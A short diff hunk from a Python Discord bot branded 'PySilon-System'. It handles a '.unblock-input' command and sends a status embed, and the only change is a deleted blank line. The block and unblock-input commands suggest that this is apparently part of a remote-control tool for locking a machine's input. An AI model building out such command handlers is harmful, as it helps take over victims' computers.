@@ -33,6 +33,5 @@ elif message.content == '.unblock-input':
     embed = discord.Embed(title="🚫 Input Unblocked",description=f'```Input has been unblocked. Block it by using .block-input```', colour=0x013220)
     embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
     embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
-    
 
     await message.channel.send(embed=embed)
